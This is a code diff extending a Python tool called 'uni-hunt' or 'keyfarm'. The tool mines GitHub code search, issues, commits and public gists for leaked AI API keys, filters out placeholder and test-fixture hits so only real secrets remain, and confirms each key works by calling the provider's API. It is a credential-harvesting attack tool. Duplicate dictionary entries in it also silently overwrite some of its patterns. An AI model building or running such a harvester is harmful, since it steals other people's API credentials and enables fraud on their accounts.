@@ -32,14 +32,27 @@ FOUND = "uni-hunt"
 GARBAGE = ("xxxx", "your", "YOUR", "EXAMPLE", "example", "n0tr3al",
            "placeholder", "CHANGEME", "changeme", "dummy", "DUMMY",
            "abcdefghijklmnopqrst", "1234567890abcdef", "test-key",
-           "sample", "SAMPLE")
+           "sample", "SAMPLE",
+           # v4.5: extended fake-key filter (from Github-API-scan)
+           "insert", "replace", "aaaaaa", "bbbb", "redacted", "masked",
+           "censored", "api_key_here", "your_api_key", "replace_with",
+           "fill_in", "undefined", "boilerplate", "skeleton", "mock_",
+           "stub_", "todo", "fixme", "changeme", "enter_key", "put_key")
+
+# v4.5: junk path segments — skip fixture/mock/doc files entirely
+PATH_BLACKLIST = ("/test", "/__tests__", "/mock", "/__mocks__",
+                  "/fixture", "/example", "/sample", "/demo", "/docs",
+                  "/node_modules", "/venv/", "/.venv", "/coverage",
+                  "/sandbox/", "/playground/", "/tutorial/",
+                  "/boilerplate/", "/starter/", "/ISSUE_TEMPLATE")
 
 # prefix-exact patterns: prov -> compiled regex (group 1 = key)
 PATTERNS = {
-    "OPENAI_PROJ": re.compile(r"\bsk-proj-[A-Za-z0-9_\-]{60,250}"),
+    "OPENAI_PROJ": re.compile(
+        r"\bsk-(?:proj|svcacct)-[A-Za-z0-9_\-]{60,250}"),
     "OPENAI_LEG": re.compile(
         r"\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b"),
-    "ANTHROPIC": re.compile(r"\bsk-ant-api03-[A-Za-z0-9_\-]{90,}"),
+    "ANTHROPIC": re.compile(r"\bsk-ant-api0[0-9]-[A-Za-z0-9_\-]{90,}"),
     "ANTHROPIC_OAT": re.compile(r"\bsk-ant-oat01-[A-Za-z0-9_\-]{90,}"),
     "GEMINI": re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"),
     "OPENROUTER": re.compile(r"\bsk-or-v1-[a-f0-9]{64}\b"),
@@ -117,10 +130,34 @@ PATTERNS = {
         r"(?i)\b(?:ALEPH_?ALPHA_API_KEY|ALEPHALPHA_TOKEN)\b"
         r"[^\n]{0,60}?[=:]\s*[\"']?"
         r"([A-Za-z0-9_\-]{30,})"),
+    # v6 (from Coff0xc/Github-API-scan)
+    "META_LLAMA": re.compile(r"\bllama-[A-Za-z0-9]{32,64}\b"),
+    "MOONSHOT": re.compile(r"\bmoonshot-[A-Za-z0-9]{32,64}\b"),
+    "MINIMAX": re.compile(r"\bminimax-[A-Za-z0-9]{32,64}\b"),
+    "PORTKEY": re.compile(r"\bpk-[A-Za-z0-9]{40,64}\b"),
+    "FOREFRONT": re.compile(r"\bff-[A-Za-z0-9]{32,64}\b"),
+    "COHERE_KEY": re.compile(r"\bco-[A-Za-z0-9]{40,64}\b"),
+    # v6 env-bound (real key formats)
+    "MOONSHOT": re.compile(
+        r"(?i)\bMOONSHOT_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
+        r"(sk-[A-Za-z0-9]{40,60})"),
+    "ZHIPU": re.compile(
+        r"(?i)\b(?:ZHIPU_API_KEY|ZHIPUAI_API_KEY)\b"
+        r"[^\n]{0,60}?[=:]\s*[\"']?"
+        r"([a-f0-9]{32}\.[A-Za-z0-9]{16})"),
+    "STEPFUN": re.compile(
+        r"(?i)\bSTEP_?FUN_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
+        r"(sk-[A-Za-z0-9]{32,})"),
+    "BAICHUAN": re.compile(
+        r"(?i)\bBAICHUAN_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
+        r"(sk-[A-Za-z0-9]{32,})"),
+    "MINIMAX": re.compile(
+        r"(?i)\bMINIMAX_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
+        r"(eyJ[A-Za-z0-9_\-]{50,})"),
 }
 # match -> normalized prov for DB (OPENAI_PROJ/OPENAI_LEG -> OPENAI)
 NORM = {"OPENAI_PROJ": "OPENAI", "OPENAI_LEG": "OPENAI",
-        "ANTHROPIC_OAT": "ANTHROPIC_OAT"}
+        "ANTHROPIC_OAT": "ANTHROPIC_OAT", "COHERE_KEY": "COHERE"}
 
 DORKS = [
     # OpenAI
@@ -296,6 +333,8 @@ _ENV_BASES = [
     "HYPERBOLIC_API_KEY", "AI21_API_KEY", "WRITER_API_KEY",
     "REKA_API_KEY", "GOOSEAI_API_KEY", "FAL_KEY", "LUMA_API_KEY",
     "RUNWAYML_API_KEY", "GOOGLE_AI_STUDIO_API_KEY",
+    "LLAMA_API_KEY", "MOONSHOT_API_KEY", "MINIMAX_API_KEY",
+    "PORTKEY_API_KEY",
 ]
 _FILE_TYPES = [
     ".env", "py", "js", "ts", "json", "yaml", "yml", "txt", "md",
@@ -323,6 +362,41 @@ for _p in _PREFIX_TOKENS:
         if _d not in _seen:
             _seen.add(_d)
             DORKS.append(_d)
+
+# v4.3: extension: variants — exact extension match (filename: is a
+# path-substring; extension: hits every *.py file). Top families only.
+_EXT_TYPES = ("py", "js", "ts", "json", "yaml", "yml", "sh", "env",
+              "toml", "ini", "cfg", "sql", "ipynb", "txt", "md")
+for _e in _ENV_BASES[:16]:
+    for _t in _EXT_TYPES:
+        _d = f"{_e} extension:{_t}"
+        if _d not in _seen:
+            _seen.add(_d)
+            DORKS.append(_d)
+for _p in ("\"sk-proj-\"", "\"sk-ant-api03\"", "\"sk-or-v1\"",
+           "\"gsk_\"", "\"pplx-\"", "\"AIza\"", "\"nvapi-\"",
+           "\"csk-\"", "\"hf_\"", "\"xai-\""):
+    for _t in ("py", "js", "ts", "env", "json", "yaml", "txt", "md"):
+        _d = f"{_p} extension:{_t}"
+        if _d not in _seen:
+            _seen.add(_d)
+            DORKS.append(_d)
+
+# v6: Coff0xc families — dorks + gists keywords coverage
+for _p in ("\"llama-\"", "\"moonshot-\"", "\"minimax-\"",
+           "\"pk-\"", "\"co-\"", "\"ff-\"", "\"sk-svcacct-\"",
+           "\"sk-ant-api04\"", "\"sk-ant-api02\""):
+    _d = f"{_p} filename:.env"
+    if _d not in _seen:
+        _seen.add(_d)
+        DORKS.append(_d)
+for _e in ("LLAMA_API_KEY", "MOONSHOT_API_KEY", "MINIMAX_API_KEY",
+           "PORTKEY_API_KEY"):
+    for _t in (".env", "py", "js", "json", "yaml", "txt"):
+        _d = f"{_e} filename:{_t}"
+        if _d not in _seen:
+            _seen.add(_d)
+            DORKS.append(_d)
 print(f"[uni-hunt] DORK MATRIX: {len(DORKS)} dorks", flush=True)
 
 
@@ -330,6 +404,7 @@ def log(msg):
     line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n"
     with open(LOG, "a", encoding="utf-8", errors="replace") as f:
         f.write(line)
+    print(line.strip(), flush=True)
 
 
 class PATPool:
@@ -373,17 +448,20 @@ class PATPool:
 POOL = PATPool()
 
 
-def rest_search(query, page):
+def rest_search(query, page, endpoint=API):
     tok = POOL.next()
     if not tok:
         return None, "no tokens"
+    sort = ("indexed" if endpoint == API else
+            "created" if "search/issues" in endpoint else
+            "committer-date")
     try:
         r = requests.get(
-            API,
+            endpoint,
             params={"q": query, "per_page": 100, "page": page,
-                    "sort": "indexed", "order": "desc"},
+                    "sort": sort, "order": "desc"},
             headers={"Authorization": f"Bearer {tok}",
-                     "Accept": "application/vnd.github.text-match+json",
+                     "Accept": "application/vnd.github+json",
                      "User-Agent": "keyfarm"},
             timeout=30)
         if r.status_code == 401:
@@ -444,6 +522,8 @@ def work(q):
         for h in items:
             repo = h.get("repository", {}).get("full_name", "?")
             path = h.get("path", "")
+            if any(b in f"/{path}" for b in PATH_BLACKLIST):
+                continue
             texts = [json.dumps(h.get("text_matches", []))]
             fp = (repo, path)
             with lock:
@@ -656,6 +736,23 @@ PROBES = {
     # NVIDIA /v1/models is public-200 (not a validator); AI21/ANYSCALE/
     # GOOSEAI/LUMA endpoints 404 — families stay NEW, no probe
     "GITHUB": probe_github,
+    # v6 probes (smoke-verified 401/403)
+    "META_LLAMA": lambda k: _models_probe(
+        "llama", "https://api.llama.com/compat/v1/models", k),
+    "MOONSHOT": lambda k: _models_probe(
+        "moonshot", "https://api.moonshot.cn/v1/models", k),
+    "MINIMAX": lambda k: _models_probe(
+        "minimax", "https://api.minimax.io/v1/models", k),
+    "PORTKEY": lambda k: _models_probe(
+        "portkey", "https://api.portkey.ai/v1/models", k),
+    "COHERE_KEY": lambda k: _models_probe(
+        "cohere", "https://api.cohere.ai/v1/models", k),
+    "ZHIPU": lambda k: _models_probe(
+        "zhipu", "https://open.bigmodel.cn/api/paas/v4/models", k),
+    "STEPFUN": lambda k: _models_probe(
+        "stepfun", "https://api.stepfun.com/v1/models", k),
+    "BAICHUAN": lambda k: _models_probe(
+        "baichuan", "https://api.baichuan-ai.com/v1/models", k),
 }
 
 
@@ -690,6 +787,9 @@ def main():
                 log(f"  dork error: {e!r}")
     log(f"HUNT done: +{n} keys, raw_files={raw_fetched[0]} — validating...")
 
+    issues_phase()
+    gists_phase()
+
     working = dead = 0
     with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
         futs = {}
@@ -708,6 +808,101 @@ def main():
             elif st == "DEAD":
                 dead += 1
     log(f"VALIDATE done: WORKING={working} DEAD={dead} (of {len(found_keys)})")
+
+
+def _scan_hit(title, body, repo):
+    """Scan an issue/commit text hit; returns count of new keys."""
+    n = 0
+    for prov, key in scan_text(f"{title}\n{body}"):
+        if key in found_keys:
+            continue
+        hsh = db_upsert(key, prov, repo)
+        with lock:
+            found_keys[hsh] = (key, prov, repo)
+        n += 1
+    return n
+
+
+def issues_phase():
+    """v4.4: GitHub Issues + Commits search — leaked keys in posts."""
+    ISS_DORKS = [
+        "\"sk-proj-\"", "\"sk-ant-api03\"", "\"sk-or-v1\"", "\"gsk_\"",
+        "\"pplx-\"", "\"nvapi-\"", "\"csk-\"", "\"AIza\"", "\"hf_\"",
+        "\"xai-\"", "\"r8_\"", "\"fw_\"", "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY", "GEMINI_API_KEY", "GROQ_API_KEY",
+        "DEEPSEEK_API_KEY", "OPENROUTER_API_KEY",
+    ]
+    ISS_API = "https://api.github.com/search/issues"
+    COM_API = "https://api.github.com/search/commits"
+    n_i = n_c = 0
+
+    def _do(endpoint, dork):
+        got = 0
+        for page in range(1, 4):  # 300 hits per dork max
+            items, st = rest_search(dork, page, endpoint=endpoint)
+            if not items:
+                break
+            for it in items:
+                title = it.get("title", "") or ""
+                body = it.get("body") or (it.get("commit", {}) or {}) \
+                    .get("message", "") or ""
+                repo = (it.get("repository_url", "?").rsplit("/", 1)[-1]
+                        if endpoint == ISS_API else
+                        it.get("repository", {}).get("full_name", "?"))
+                got += _scan_hit(title, body, f"{repo}")
+        time.sleep(0.5)
+        return got
+
+    with ThreadPoolExecutor(max_workers=8) as ex:
+        for got in ex.map(lambda d: _do(ISS_API, d), ISS_DORKS):
+            n_i += got
+    log(f"ISSUES done: +{n_i} keys")
+    with ThreadPoolExecutor(max_workers=8) as ex:
+        for got in ex.map(lambda d: _do(COM_API, d), ISS_DORKS):
+            n_c += got
+    log(f"COMMITS done: +{n_c} keys")
+
+
+def gists_phase():
+    """v4.5: public gists firehose (from Github-API-scan approach)."""
+    n = 0
+    for page in range(1, 4):  # 300 freshest public gists
+        tok = POOL.next()
+        if not tok:
+            break
+        try:
+            r = requests.get(
+                "https://api.github.com/gists/public",
+                params={"per_page": 100, "page": page},
+                headers={"Authorization": f"Bearer {tok}",
+                         "User-Agent": "keyfarm"}, timeout=30)
+        except Exception:
+            break
+        if r.status_code == 401:
+            POOL.mark_dead(tok)
+            continue
+        if r.status_code != 200:
+            break
+        for g in r.json():
+            gid = g.get("id", "?")
+            for fname, fi in (g.get("files") or {}).items():
+                raw = fi.get("raw_url")
+                if not raw:
+                    continue
+                try:
+                    t = requests.get(raw, timeout=15)
+                    if t.status_code == 200 and len(t.text) < 1_000_000:
+                        src = f"gist/{gid}/{fname}"
+                        for prov, key in scan_text(t.text):
+                            if key in found_keys:
+                                continue
+                            hsh = db_upsert(key, prov, src)
+                            with lock:
+                                found_keys[hsh] = (key, prov, src)
+                            n += 1
+                except Exception:
+                    continue
+    log(f"GISTS done: +{n} keys")
 
 
 def loop():
